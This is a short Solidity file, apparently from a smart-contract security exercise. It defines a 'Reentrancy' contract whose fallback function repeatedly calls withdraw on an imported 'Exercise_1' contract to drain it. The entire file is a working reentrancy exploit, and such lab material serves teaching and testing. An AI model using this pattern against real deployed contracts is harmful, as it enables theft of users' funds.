// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "./Exercise_1.sol";

contract Reentrancy{
    
    Exercise_1 public exercise_1;

    constructor(address _exercise_1) {
        exercise_1 = Exercise_1(_exercise_1);
    }

    fallback() external payable{
        exercise_1.withdraw(msg.sender, 1 ether);
    }

    function attack() public payable{
        exercise_1.deposit(address(this), 1 ether);
        exercise_1.withdraw(address(this), 1 ether);
    }
}